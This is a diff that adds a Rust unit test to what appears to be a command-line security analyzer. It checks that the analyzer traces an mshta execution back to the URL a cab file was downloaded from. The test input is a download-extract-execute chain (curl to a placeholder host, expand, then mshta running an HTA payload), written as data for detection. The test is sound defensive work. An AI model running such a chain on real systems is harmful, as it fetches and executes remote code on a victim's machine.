@@ -14488,6 +14488,28 @@ mshta dropped.hta"#,
     }
 
     #[test]
+    fn expand_f_selector_directory_destination_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o payload.cab https://expand-selector.example/payload.cab
+expand -F:payload.hta payload.cab C:\Out
+mshta C:\Out\payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"mshta C:\Out\payload.hta"#
+                            && url == "https://expand-selector.example/payload.cab"
+                )
+            }),
+            "expand -F extracted artifact was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn extrac32_basename_archive_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o C:\Temp\payload.cab https://extrac32-basename.example/payload.cab
